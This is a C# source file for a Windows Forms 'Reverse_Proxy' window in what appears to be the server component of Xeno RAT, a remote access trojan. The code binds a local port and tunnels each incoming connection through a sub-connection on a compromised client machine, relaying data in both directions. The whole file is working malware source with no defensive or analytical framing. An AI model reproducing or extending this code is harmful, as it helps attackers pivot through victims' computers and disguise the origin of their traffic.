using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace xeno_rat_server.Forms
{
    public partial class Reverse_Proxy : Form
    {
        Node client;
        public Reverse_Proxy(Node _client)
        {
            InitializeComponent();
            client = _client;
            client.AddTempOnDisconnect(TempOnDisconnect);
        }
        private const int BUFSIZE = 1024;
        private const int TIMEOUT_SOCKET = 5;
        private const string LOCAL_ADDR = "127.0.0.1";
        private List<Node> killnodes = new List<Node>();
        private Socket new_socket = null;
        public void TempOnDisconnect(Node node)
        {
            if (node == client)
            {
                if (new_socket != null)
                {
                    new_socket.Close(0);
                    new_socket = null;
                }
                if (!this.IsDisposed)
                {
                    this.BeginInvoke((MethodInvoker)(() =>
                    {
                        this.Close();
                    }));
                }
            }
        }
        private static Socket CreateSocket()
        {
            try
            {
                Socket sock = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReceiveTimeout, TIMEOUT_SOCKET);
                return sock;
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Failed to create socket: {0}", ex.Message);
                return null;
            }
        }

        private static bool BindPort(Socket sock, int LOCAL_PORT)
        {
            try
            {
                Console.WriteLine("Bind {0}", LOCAL_PORT);
                sock.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.ReuseAddress, true);
                sock.Bind(new IPEndPoint(IPAddress.Parse(LOCAL_ADDR), LOCAL_PORT));
            }
            catch (SocketException ex)
            {
                Console.WriteLine("Bind failed: {0}", ex.Message);
                sock.Close(0);
                return false;
            }

            try
            {
                sock.Listen(5);
            }
            catch
            {
                sock.Close(0);
            }

            return true;
        }

        private async Task ProxyLoop(Node socketSrc, Socket socketDst)
        {
            killnodes.Add(socketSrc);
            while (button2.Enabled && socketSrc.Connected() && socketDst.Connected && new_socket != null)
            {
                try
                {

                    // Use Task.WhenAny to asynchronously wait for data availability
                    await Task.WhenAny(
                        Task.Run(() => socketSrc.sock.sock.Poll(1000, SelectMode.SelectRead)),
                        Task.Run(() => socketDst.Poll(1000, SelectMode.SelectRead))
                    );

                    if (socketSrc.sock.sock.Available > 0)
                    {
                        byte[] buffer = new byte[BUFSIZE];
                        int bytesRead = await socketSrc.sock.sock.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);
                        if (bytesRead == 0)
                        {
                            break;
                        }
                        await socketDst.SendAsync(new ArraySegment<byte>(buffer, 0, bytesRead), SocketFlags.None);
                    }
                    if (socketDst.Available > 0)
                    {
                        byte[] buffer = new byte[BUFSIZE];
                        int bytesRead = await socketDst.ReceiveAsync(new ArraySegment<byte>(buffer), SocketFlags.None);
                        if (bytesRead == 0)
                        {
                            break;
                        }
                        await socketSrc.sock.sock.SendAsync(new ArraySegment<byte>(buffer, 0, bytesRead), SocketFlags.None);
                    }
                }
                catch
                {
                    break;
                }
                await Task.Delay(200); // Use Task.Delay for non-blocking delay
            }

            //socketSrc.Disconnect();
            if (new_socket != null)
            {
                await Task.Factory.FromAsync(new_socket.BeginDisconnect, new_socket.EndDisconnect, true, null);
                new_socket.Dispose();
                //new_socket.Close(0);
                new_socket = null;
            }
        }


        private async Task<Node> CreateSubSubNode(Node client)
        {
            Node SubSubNode = await client.Parent.CreateSubNodeAsync(2);
            int id = await Utils.SetType2setIdAsync(SubSubNode);
            if (id != -1)
            {
                await Utils.Type2returnAsync(SubSubNode);
                byte[] a = SubSubNode.sock.IntToBytes(id);
                await client.SendAsync(a);
                byte[] found = await client.ReceiveAsync();
                if (found == null || found[0] == 0)
                {
                    SubSubNode.Disconnect();
                    return null;
                }
            }
            else
            {
                SubSubNode.Disconnect();
                return null;
            }
            return SubSubNode;
        }

        private async Task threaded(Socket new_socket)
        {
            while (button2.Enabled)
            {
                try
                {
                    Socket wrapper = await new_socket.AcceptAsync();
                    Node subnode = await CreateSubSubNode(client);
                    ProxyLoop(subnode, wrapper);
                }
                catch
                {
                    continue;
                }
            }
            if (new_socket != null)
            {
                new_socket.Close(0);
                new_socket = null;
            }
        }

        private async void button1_Click(object sender, EventArgs e)
        {   
            int port;
            if (!int.TryParse(textBox1.Text, out port)) 
            {
                MessageBox.Show("Invalid port");
                return;
            }
            new_socket = CreateSocket();
            if (!BindPort(new_socket, port)) 
            {
                MessageBox.Show("Could not bind port. Another process may already be using that port.");
                return;
            }
            button1.Enabled = false;
            button2.Enabled = true;
            await threaded(new_socket);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            foreach (Node i in killnodes)
            {
                if (i!=null)
                i.Disconnect();
            }
            killnodes.Clear();
            if (new_socket != null)
            {
                new_socket.Close(0);
                new_socket = null;
            }
            button1.Enabled = true;
            button2.Enabled = false;

        }

        private void Reverse_Proxy_FormClosing(object sender, FormClosingEventArgs e)
        {

        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void Reverse_Proxy_Load(object sender, EventArgs e)
        {

        }
    }
}
